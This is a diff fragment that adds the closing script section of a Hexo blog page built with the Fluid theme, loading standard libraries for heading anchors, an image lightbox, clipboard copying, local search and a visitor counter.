+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
